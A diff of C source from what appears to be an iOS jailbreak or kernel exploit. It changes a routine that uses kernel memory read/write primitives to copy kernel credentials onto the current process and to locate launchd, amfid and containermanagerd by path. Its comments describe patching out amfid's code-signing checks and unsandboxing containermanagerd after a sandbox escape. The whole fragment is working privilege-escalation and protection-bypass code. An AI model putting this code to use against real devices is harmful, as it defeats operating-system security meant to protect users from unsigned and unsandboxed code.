@@ -99,38 +99,27 @@ void fix_launchd_after_sandbox_escape(mach_port_t real_service, mach_port_t mitm
   wk64(real_service_ipc_entry+0x10, 0);
 }
 
-uint64_t find_proc(char* target_p_comm) {
-  uint64_t proc = rk64(allproc);
-  
-  for (int i = 0; i < 1000; i++) {
-    char* p_comm = rkmem(proc+struct_proc_p_comm_offset, 16); // p_comm
-    if (!p_comm){
-      return 0;
-    }
-    if (strstr(p_comm, target_p_comm)) {
-      free(p_comm);
-      return proc;
-    }
-    
-    free(p_comm);
-    proc = rk64(proc);
-  }
-  return 0;
-}
+#define LAUNCHD           "/sbin/launchd"
+#define AMFID             "/usr/libexec/amfid"
+#define CONTAINERMANAGERD "/System/Library/PrivateFrameworks/MobileContainerManager.framework/Support/containermanagerd"
 
 void disable_protections(uint64_t kernel_base, uint64_t realhost) {
   allproc = kernel_base + allproc_offset;
 
-  launchd_proc = find_proc("launchd");
-  amfid_proc = find_proc("amfid");
-  containermanager_proc = find_proc("containermanager");
-  
+  // Give ourselves the kernel credentials so that we can find processes.
+  bool success = proc_copy_credentials(currentproc, kernproc);
+  assert(success);
+
+  success = proc_find_path(&launchd_proc, LAUNCHD, true);
+  assert(success);
+  success = proc_find_path(&amfid_proc, AMFID, true);
+  assert(success);
+  success = proc_find_path(&containermanager_proc, CONTAINERMANAGERD, true);
+  assert(success);
+
   // we can then fix up launchd's send right to the service we messed up
   // and give ourselves launchd's creds
   // then patch out the codesigning checks in amfid.
-
-  bool success = proc_copy_credentials(currentproc, kernproc);
-  assert(success);
 
   // unsandbox containermanagerd so it can make the containers for uid 0 processes
   // I do also have a patch for containermanagerd to fixup the persona_id in the sb_packbuffs
